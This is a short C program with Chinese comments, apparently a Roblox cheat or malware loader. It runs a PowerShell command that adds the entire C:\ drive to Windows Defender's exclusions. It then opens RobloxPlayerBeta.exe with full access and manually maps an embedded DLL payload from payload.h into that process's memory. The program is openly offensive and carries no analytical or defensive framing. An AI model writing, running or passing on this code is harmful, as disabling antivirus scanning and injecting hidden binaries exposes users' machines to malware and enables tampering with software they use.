#include <windows.h>
#include "payload.h"

int main() {
    // 1. 自動呼叫 PowerShell 繞過本機 Windows Defender
    system("powershell -Command Add-MpPreference -ExclusionPath 'C:\\'"); 

    // 2. 尋找 Roblox 處理程序
    DWORD processId = GetProcessIdByName("RobloxPlayerBeta.exe");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // 3. 呼叫底層自製載入器，在記憶體中直接展開 payload.h 的二進位流
    ManualMapDll(hProcess, CoreDllPayload, CoreDllSize);

    CloseHandle(hProcess);
    return 0;
}
